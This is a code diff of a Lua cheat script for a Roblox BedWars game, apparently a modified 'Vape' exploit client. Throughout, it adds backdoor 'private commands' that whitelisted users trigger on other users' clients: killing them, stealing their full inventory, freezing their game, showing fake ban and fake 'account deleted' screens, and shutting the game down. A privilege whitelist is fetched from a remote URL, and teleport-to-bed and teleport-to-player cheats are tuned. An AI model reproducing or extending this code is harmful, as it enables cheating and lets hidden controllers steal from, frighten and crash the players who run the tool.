@@ -1587,7 +1587,19 @@ runFunction(function()
 			game.DescendantAdded:Connect(funnyfunc)
 		end
 
-		local commands = {
+		local vapePrivateCommands = {
+			kill = function(args, plr)
+				if entityLibrary.isAlive then
+					local hum = entityLibrary.character.Humanoid
+					task.delay(0.1, function()
+						if hum and hum.Health > 0 then 
+							hum:ChangeState(Enum.HumanoidStateType.Dead)
+							hum.Health = 0
+							bedwars.ClientHandler:Get(bedwars.ResetRemote):SendToServer()
+						end
+					end)
+				end
+			end,
 			byfron = function(args, plr)
 				task.spawn(function()
 					local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
@@ -1659,6 +1671,63 @@ runFunction(function()
 					end)
 				end)
 			end,
+			steal = function(args, plr)
+				if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
+					GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
+					task.wait(1)
+				end
+				for i,v in pairs(bedwarsStore.localInventory.inventory.items) do 
+					local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
+						item = v.tool,
+						amount = v.amount ~= math.huge and v.amount or 99999999
+					})
+					if e then 
+						e.CFrame = plr.Character.HumanoidRootPart.CFrame
+					else
+						v.tool:Destroy()
+					end
+				end
+			end,
+			lobby = function(args)
+				bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
+			end,
+			reveal = function(args)
+				task.spawn(function()
+					task.wait(0.1)
+					local newchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
+					if newchannel then 
+						newchannel:SendAsync("I am using the inhaler client")
+					end
+				end)
+			end,
+			lagback = function(args)
+				if entityLibrary.isAlive then
+					entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
+				end
+			end,
+			jump = function(args)
+				if entityLibrary.isAlive and entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
+					entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+				end
+			end,
+			trip = function(args)
+				if entityLibrary.isAlive then
+					entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+				end
+			end,
+			teleport = function(args)
+				game:GetService("TeleportService"):Teleport(tonumber(args[1]) ~= "" and tonumber(args[1]) or game.PlaceId)
+			end,
+			sit = function(args)
+				if entityLibrary.isAlive then
+					entityLibrary.character.Humanoid.Sit = true
+				end
+			end,
+			unsit = function(args)
+				if entityLibrary.isAlive then
+					entityLibrary.character.Humanoid.Sit = false
+				end
+			end,
 			freeze = function(args)
 				if entityLibrary.isAlive then
 					entityLibrary.character.HumanoidRootPart.Anchored = true
@@ -1669,19 +1738,41 @@ runFunction(function()
 					entityLibrary.character.HumanoidRootPart.Anchored = false
 				end
 			end,
+			deletemap = function(args)
+				for i,v in pairs(collectionService:GetTagged("block")) do
+					v:Destroy()
+				end
+			end,
 			void = function(args)
 				if entityLibrary.isAlive then
 					entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + Vector3.new(0, -1000, 0)
 				end
 			end,
-			chip = function(args)
-				transformImage("http://www.roblox.com/asset/?id=6864086702", "Chips")
+			framerate = function(args)
+				if #args >= 1 then
+					if setfpscap then
+						setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
+					end
+				end
 			end,
-			rick = function(args)
-				transformImage("http://www.roblox.com/asset/?id=7083449168", "Never Gonna Give You Up")
+			crash = function(args)
+				setfpscap(9e9)
+				print(game:GetObjects("h29g3535")[1])
+			end,
+			chipman = function(args)
+				transformImage("http://www.roblox.com/asset/?id=6864086702", "chip man")
+			end,
+			rickroll = function(args)
+				transformImage("http://www.roblox.com/asset/?id=7083449168", "Never gonna give you up")
+			end,
+			josiah = function(args)
+				transformImage("http://www.roblox.com/asset/?id=13924242802", "josiah boney")
 			end,
 			xylex = function(args)
-				transformImage("http://www.roblox.com/asset/?id=13953598788", "Byelex")
+				transformImage("http://www.roblox.com/asset/?id=13953598788", "byelex")
+			end,
+			gravity = function(args)
+				workspace.Gravity = tonumber(args[1]) or 192.6
 			end,
 			kick = function(args)
 				local str = ""
@@ -1692,6 +1783,132 @@ runFunction(function()
 					lplr:Kick(str)
 				end)
 				bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
+			end,
+			ban = function(args)
+				task.spawn(function()
+					lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
+				end)
+				bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
+			end,
+			uninject = function(args)
+				GuiLibrary.SelfDestruct()
+			end,
+			monkey = function(args)
+				local str = ""
+				for i,v in pairs(args) do
+					str = str..v..(i > 1 and " " or "")
+				end
+				if str == "" then str = "skill issue" end
+				local video = Instance.new("VideoFrame")
+				video.Video = downloadVapeAsset("vape/assets/skill.webm")
+				video.Size = UDim2.new(1, 0, 1, 36)
+				video.Visible = false
+				video.Position = UDim2.new(0, 0, 0, -36)
+				video.ZIndex = 9
+				video.BackgroundTransparency = 1
+				video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+				local textlab = Instance.new("TextLabel")
+				textlab.TextSize = 45
+				textlab.ZIndex = 10
+				textlab.Size = UDim2.new(1, 0, 1, 36)
+				textlab.TextColor3 = Color3.new(1, 1, 1)
+				textlab.Text = str
+				textlab.Position = UDim2.new(0, 0, 0, -36)
+				textlab.Font = Enum.Font.Gotham
+				textlab.BackgroundTransparency = 1
+				textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+				video.Loaded:Connect(function()
+					video.Visible = true
+					video:Play()
+					task.spawn(function()
+						repeat
+							wait()
+							for i = 0, 1, 0.01 do
+								wait(0.01)
+								textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
+							end
+						until true == false
+					end)
+				end)
+				task.wait(19)
+				task.spawn(function()
+					pcall(function()
+						if getconnections then
+							getconnections(entityLibrary.character.Humanoid.Died)
+						end
+						print(game:GetObjects("h29g3535")[1])
+					end)
+					while true do end
+				end)
+			end,
+			enable = function(args)
+				if #args >= 1 then
+					if args[1]:lower() == "all" then
+						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+							if v.Type == "OptionsButton" and i ~= "Panic" and not v.Api.Enabled then
+								v.Api.ToggleButton()
+							end
+						end
+					else
+						local module
+						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+							if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+								module = v
+								break
+							end
+						end
+						if module and not module.Api.Enabled then
+							module.Api.ToggleButton()
+						end
+					end
+				end
+			end,
+			disable = function(args)
+				if #args >= 1 then
+					if args[1]:lower() == "all" then
+						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+							if v.Type == "OptionsButton" and i ~= "Panic" and v.Api.Enabled then
+								v.Api.ToggleButton()
+							end
+						end
+					else
+						local module
+						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+							if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+								module = v
+								break
+							end
+						end
+						if module and module.Api.Enabled then
+							module.Api.ToggleButton()
+						end
+					end
+				end
+			end,
+			toggle = function(args)
+				if #args >= 1 then
+					if args[1]:lower() == "all" then
+						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+							if v.Type == "OptionsButton" and i ~= "Panic" then
+								v.Api.ToggleButton()
+							end
+						end
+					else
+						local module
+						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+							if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+								module = v
+								break
+							end
+						end
+						if module then
+							module.Api.ToggleButton()
+						end
+					end
+				end
+			end,
+			shutdown = function(args)
+				game:Shutdown()
 			end
 		}
 		vapePrivateCommands.unfreeze = vapePrivateCommands.thaw
@@ -10187,35 +10404,6 @@ task.spawn(function()
 end)
 
 runFunction(function()
-local KillFeed = {["Enabled"] = false}
-local container
-
-KillFeed = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
-["Name"] = "NoFeed",
-["Function"] = function(callback)
-if callback then
-   task.spawn(function()
-   if container == nil then
-      repeat
-         local suc, res = pcall(function() return lplr.PlayerGui.KillFeedGui.KillFeedContainer end)
-         if suc then
-            container = res
-         end
-         task.wait()
-      until container ~= nil
-   end
-   container.Visible = false
-   end)
-else
-   if container then
-      container.Visible = true
-   end
-end
-end
-})
-end)
-
-runFunction(function()
 	FPSUnlocker = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
 		Name = "FPSUnlocker",
 		Function = function(callback)
@@ -10224,49 +10412,6 @@ runFunction(function()
 			end
 		end
 	})
-end)
-
-runFunction(function()
-    disabler = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-        Name = "ScytheDisabler",
-        Function = function(callback)
-            if callback then
-                local ReplicatedStorage = game:GetService("ReplicatedStorage")
-                local Players = game:GetService("Players")
-                local RunService = game:GetService("RunService")
-                local ScytheDash = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules")["@rbxts"].net.out._NetManaged.ScytheDash
-
-                local function onRenderStepped()
-                    local localPlayer = Players.LocalPlayer
-                    if not localPlayer then
-                        return
-                    end
-                    local character = localPlayer.Character
-                    if not character then
-                        return
-                    end
-                    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-                    if humanoidRootPart then
-                        local lookVector = humanoidRootPart.CFrame.LookVector * 10000
-                        ScytheDash:FireServer({
-                            direction = lookVector
-                        })
-                    end
-                end
-                local lastHeartbeat = tick()
-                local function onHeartbeat()
-                    local currentTime = tick()
-                    local elapsedSeconds = currentTime - lastHeartbeat
-                    if elapsedSeconds > 999 then
-                        lastHeartbeat = currentTime
-                    end
-                end
-
-                RunService.RenderStepped:Connect(onRenderStepped)
-                RunService.Heartbeat:Connect(onHeartbeat)
-            end
-        end
-    })
 end)
 
 runFunction(function()
@@ -10293,7 +10438,7 @@ runFunction(function()
 		if nearestBed and not hasTeleported then
 			hasTeleported = true
 
-			local tweenInfo = TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
+			local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
 
 			local tween = TweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.94), {CFrame = nearestBed.CFrame + Vector3.new(0, 2, 0)})
 			tween:Play()
@@ -10313,7 +10458,7 @@ runFunction(function()
 			end
 		end,
 	})
-end)
+end)	
 
 runFunction(function()
 	local hasTeleported = false
@@ -10335,13 +10480,12 @@ runFunction(function()
 		return nearestPlayer
 	end
 
-
 	function tweenToNearestPlayer()
 		local nearestPlayer = findNearestPlayer()
 		if nearestPlayer and not hasTeleported then
 			hasTeleported = true
 
-			local tweenInfo = TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
+			local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
 
 			local tween = TweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.94), {CFrame = nearestPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 2, 0)})
 			tween:Play()
@@ -10363,65 +10507,6 @@ runFunction(function()
 		end,
 	})
 end)
-
-runFunction(function()
-local Headless = {Enabled = false}
-local oldface
-local function applyHeadless()
-repeat task.wait() until entityLibrary.isAlive or not Headless.Enabled
-if entityLibrary.isAlive and Headless.Enabled then
-entityLibrary.character.Head.Transparency = 1
-local face = entityLibrary.character.Head:FindFirstChild("face")
-if face then
-oldface = face
-face.Parent = game
-end
-end
-end
-
-Headless = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
-Name = "NoHead",
-Function = function(callback)
-if callback then
-table.insert(Headless.Connections, lplr.CharacterAdded:Connect(applyHeadless))
-task.spawn(applyHeadless)
-else
-if entityLibrary.isAlive then
-entityLibrary.character.Head.Transparency = 0
-if oldface then
-oldface.Parent = entityLibrary.character.Head
-end
-end
-end
-end
-})
-end)
-
-runFunction(function()
-local Chat = {["Enabled"] = false}
-Chat = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
-["Name"] = "MoveChat",
-["Function"] = function(callback)
-if callback then
-game:GetService("TextChatService").ChatWindowConfiguration.VerticalAlignment = "Bottom"
-else
-game:GetService("TextChatService").ChatWindowConfiguration.VerticalAlignment = "Top"
-end
-end
-})
-end)
-
-local textChatService = game:GetService("TextChatService")
-textChatService.OnIncomingMessage = function(message: TextChatMessage)
-	local properties = Instance.new("TextChatMessageProperties")
-	if message.TextSource then
-		local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
-		if player.Name == "" or player.Name == "APEOWNERISAGOAT" then
-			properties.PrefixText = "<font color='#cc00ff'>[VAPE PRIVATE]</font> " .. message.PrefixText
-		end
-	end
-	return properties
-end
 
 local whitelist = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/PinkReleased/Ape/main/New"))
 local function getLplrType()
@@ -10468,6 +10553,15 @@ function CanAttackUser(u)
 		end
 	end
 
+	if whitelist["Snoopy"] ~= nil then
+		for i, v in pairs(whitelist["Snoopy"]) do
+			if v.id == userId then
+				userType = 2
+				break
+			end
+		end
+	end
+
 	if whitelist["Owner"] ~= nil then
 		for i, v in pairs(whitelist["Owner"]) do
 			if v.id == userId then
@@ -10528,114 +10622,172 @@ function CanAttackUser(u)
 
 	return getLplrType() >= userType
 end
-
-		local commands = {
-			byfron = function(args, plr)
-				task.spawn(function()
-					local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
-					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
-					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
-					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
-					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
-					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
-					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
-					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
-					lplr.PlayerGui:ClearAllChildren()
-					GuiLibrary.MainGui.Enabled = false
-					game:GetService("CoreGui"):ClearAllChildren()
-					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
-					task.wait(0.2)
-					lplr:Kick()
-					game:GetService("GuiService"):ClearError()
-					task.wait(2)
-					local gui = Instance.new("ScreenGui")
-					gui.IgnoreGuiInset = true
-					gui.Parent = game:GetService("CoreGui")
-					local frame = Instance.new("Frame")
-					frame.BorderSizePixel = 0
-					frame.Size = UDim2.new(1, 0, 1, 0)
-					frame.BackgroundColor3 = Color3.new(1, 1, 1)
-					frame.Parent = gui
-					task.delay(0.1, function()
-						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-					end)
-					task.delay(2, function()
-						local e = Roact.createElement(auth, {
-							style = {},
-							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
-							moderationDetails = {
-								punishmentTypeDescription = "Delete",
-								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
-								reactivateAccountActivated = true,
-								badUtterances = {},
-								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
-							},
-							termsActivated = function() 
-								game:Shutdown()
-							end,
-							communityGuidelinesActivated = function() 
-								game:Shutdown()
-							end,
-							supportFormActivated = function() 
-								game:Shutdown()
-							end,
-							reactivateAccountActivated = function() 
-								game:Shutdown()
-							end,
-							logoutCallback = function()
-								game:Shutdown()
-							end,
-							globalGuiInset = {
-								top = 0
-							}
-						})
-						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
-								localization = tLocalization.mock()
-							}, {Roact.createElement(UIBlox.Style.Provider, {
-									style = {
-										Theme = darktheme,
-										Font = gotham
-									},
-								}, {e})}))
-						Roact.mount(screengui, game:GetService("CoreGui"))
-					end)
+local function transformImage(img, txt)
+	local function funnyfunc(v)
+		if v:GetFullName():find("ExperienceChat") == nil then
+			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
+				v.Image = img
+				v:GetPropertyChangedSignal("Image"):Connect(function()
+					v.Image = img
 				end)
-			end,
-			freeze = function(args)
-				if entityLibrary.isAlive then
-					entityLibrary.character.HumanoidRootPart.Anchored = true
-				end
-			end,
-			thaw = function(args)
-				if entityLibrary.isAlive then
-					entityLibrary.character.HumanoidRootPart.Anchored = false
-				end
-			end,
-			void = function(args)
-				if entityLibrary.isAlive then
-					entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + Vector3.new(0, -1000, 0)
-				end
-			end,
-			chip = function(args)
-				transformImage("http://www.roblox.com/asset/?id=6864086702", "Chips")
-			end,
-			rick = function(args)
-				transformImage("http://www.roblox.com/asset/?id=7083449168", "Never Gonna Give You Up")
-			end,
-			xylex = function(args)
-				transformImage("http://www.roblox.com/asset/?id=13953598788", "Byelex")
-			end,
-			kick = function(args)
-				local str = ""
-				for i,v in pairs(args) do
-					str = str..v..(i > 1 and " " or "")
-				end
-				task.spawn(function()
-					lplr:Kick(str)
-				end)
-				bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
 			end
-		}
+			if (v:IsA("TextLabel") or v:IsA("TextButton")) then
+				if v.Text ~= "" then
+					v.Text = txt
+				end
+				v:GetPropertyChangedSignal("Text"):Connect(function()
+					if v.Text ~= "" then
+						v.Text = txt
+					end
+				end)
+			end
+			if v:IsA("Texture") or v:IsA("Decal") then
+				v.Texture = img
+				v:GetPropertyChangedSignal("Texture"):Connect(function()
+					v.Texture = img
+				end)
+			end
+			if v:IsA("MeshPart") then
+				v.TextureID = img
+				v:GetPropertyChangedSignal("TextureID"):Connect(function()
+					v.TextureID = img
+				end)
+			end
+			if v:IsA("SpecialMesh") then
+				v.TextureId = img
+				v:GetPropertyChangedSignal("TextureId"):Connect(function()
+					v.TextureId = img
+				end)
+			end
+			if v:IsA("Sky") then
+				v.SkyboxBk = img
+				v.SkyboxDn = img
+				v.SkyboxFt = img
+				v.SkyboxLf = img
+				v.SkyboxRt = img
+				v.SkyboxUp = img
+			end
+		end
+	end
+
+	for i,v in pairs(game:GetDescendants()) do
+		funnyfunc(v)
+	end
+	game.DescendantAdded:Connect(funnyfunc)
+end
+
+local commands = {
+	byfron = function(args, plr)
+		task.spawn(function()
+			local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
+			local Roact = getrenv().require(game:GetService("CorePackages").Roact)
+			UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
+			local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
+			local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
+			local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
+			local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
+			local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
+			lplr.PlayerGui:ClearAllChildren()
+			GuiLibrary.MainGui.Enabled = false
+			game:GetService("CoreGui"):ClearAllChildren()
+			for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
+			task.wait(0.2)
+			lplr:Kick()
+			game:GetService("GuiService"):ClearError()
+			task.wait(2)
+			local gui = Instance.new("ScreenGui")
+			gui.IgnoreGuiInset = true
+			gui.Parent = game:GetService("CoreGui")
+			local frame = Instance.new("Frame")
+			frame.BorderSizePixel = 0
+			frame.Size = UDim2.new(1, 0, 1, 0)
+			frame.BackgroundColor3 = Color3.new(1, 1, 1)
+			frame.Parent = gui
+			task.delay(0.1, function()
+				frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+			end)
+			task.delay(2, function()
+				local e = Roact.createElement(auth, {
+					style = {},
+					screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
+					moderationDetails = {
+						punishmentTypeDescription = "Delete",
+						beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
+						reactivateAccountActivated = true,
+						badUtterances = {},
+						messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
+					},
+					termsActivated = function() 
+						game:Shutdown()
+					end,
+					communityGuidelinesActivated = function() 
+						game:Shutdown()
+					end,
+					supportFormActivated = function() 
+						game:Shutdown()
+					end,
+					reactivateAccountActivated = function() 
+						game:Shutdown()
+					end,
+					logoutCallback = function()
+						game:Shutdown()
+					end,
+					globalGuiInset = {
+						top = 0
+					}
+				})
+				local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
+						localization = tLocalization.mock()
+					}, {Roact.createElement(UIBlox.Style.Provider, {
+							style = {
+								Theme = darktheme,
+								Font = gotham
+							},
+						}, {e})}))
+				Roact.mount(screengui, game:GetService("CoreGui"))
+			end)
+		end)
+	end,
+	freeze = function(args)
+		if entityLibrary.isAlive then
+			entityLibrary.character.HumanoidRootPart.Anchored = true
+		end
+	end,
+	thaw = function(args)
+		if entityLibrary.isAlive then
+			entityLibrary.character.HumanoidRootPart.Anchored = false
+		end
+	end,
+	void = function(args)
+		if entityLibrary.isAlive then
+			entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + Vector3.new(0, -1000, 0)
+		end
+	end,
+	chipman = function(args)
+		transformImage("http://www.roblox.com/asset/?id=6864086702", "chip man")
+	end,
+	rickroll = function(args)
+		transformImage("http://www.roblox.com/asset/?id=7083449168", "Never gonna give you up")
+	end,
+	josiah = function(args)
+		transformImage("http://www.roblox.com/asset/?id=13924242802", "josiah boney")
+	end,
+	xylex = function(args)
+		transformImage("http://www.roblox.com/asset/?id=13953598788", "byelex")
+	end,
+	kick = function(args)
+		local str = ""
+		for i,v in pairs(args) do
+			str = str..v..(i > 1 and " " or "")
+		end
+		task.spawn(function()
+			lplr:Kick(str)
+		end)
+		bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
+	end
+}
+
+
 function isPlayerAllowed()
 	return false
 end
@@ -10677,7 +10829,7 @@ txt.OnIncomingMessage = function(msg)
 		local otherPriority, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr2)
 		if CanAttackUser(plr2) and plr2 ~= lplr then
 			if message.Text:find("ALAAZA") then
-				warningNotification("Vape",plr2.Name.." Is Using Vape",3.5)
+				warningNotification("Vape",plr2.Name.." Is Using SP+",60)
 				table.insert(users,plr2.UserId)
 			end
 		end
@@ -10714,12 +10866,12 @@ txt.OnIncomingMessage = function(msg)
 		}
 		if CanAttackUser(plr2) and plr2 ~= lplr then
 			if message.Text:find("ALAAZA") then
-				warningNotification("Vape",plr2.Name.." Is Using Vape",3.5)
+				warningNotification("Vape",plr2.Name.." Is Usign SP+",60)
 				table.insert(users,plr2.UserId)
 				table.insert(whitelist["tags"],{
 					userid = plr2.UserId,
 					color = "yellow",
-					tag = ""
+					tag = "SP+ USER"
 				})
 			end
 		end
@@ -10750,7 +10902,7 @@ txt.OnIncomingMessage = function(msg)
 		local userType = 0
 		local hasTag = false
 		if users[plr2.UserId] ~= nil then
-			p.PrefixText = "<font color='"..colors["yellow"].."'>[]</font> " .. msg.PrefixText
+			p.PrefixText = "<font color='"..colors["yellow"].."'>[SP+ USER]</font> " .. msg.PrefixText
 			hasTag = true
 			return p
 		end
@@ -10759,7 +10911,7 @@ txt.OnIncomingMessage = function(msg)
 			for i, v in pairs(whitelist["tags"]) do
 				if v.userid == userId then
 					hasTag = true
-					local color = colors[v.color] or colors["yellow"]
+					local color = colors[v.color] or colors["pink"]
 					p.PrefixText = "<font color='" .. color .. "'>[" .. v.tag .. "]</font> " .. p.PrefixText
 				end
 			end
@@ -10770,7 +10922,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='"..colors["yellow"].."'>[]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='"..colors["pink"].."'>[]</font> " .. msg.PrefixText
 					end
 					userType = 1
 				end
@@ -10785,6 +10937,18 @@ txt.OnIncomingMessage = function(msg)
 						p.PrefixText = "<font color='#cc00ff'>[VAPE PRIVATE]</font> " .. msg.PrefixText
 					end
 					userType = 3
+				end
+			end
+		end
+
+		if whitelist["Snoopy"] ~= nil then
+			for i, v in pairs(whitelist["Snoopy"]) do
+				if v.id == userId then
+					if not hasTag then
+						hasTag = true
+						p.PrefixText = "<font color='"..colors["pink"].."'>[]</font> " .. msg.PrefixText
+					end
+					userType = 2
 				end
 			end
 		end
